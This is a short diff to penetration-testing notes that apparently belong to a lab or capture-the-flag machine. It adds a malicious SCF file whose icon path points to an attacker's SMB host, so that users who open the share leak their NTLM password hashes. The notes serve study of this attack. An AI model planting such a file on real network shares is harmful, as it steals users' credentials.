@@ -118,6 +118,15 @@ Firmware Update
 SMB File Upload
 - This [blog](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) suggests that by crafting a malicious SCF file and placing it somewhere in network shares, we can automatically capture a user's NTLM password hashes when they access the share.
 
+Contents of the `payload.scf` file.
+```CSS
+[Shell]
+Command=2
+IconFile=\\10.10.14.14\tools\responder.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
 
 
 SMB Enumeration
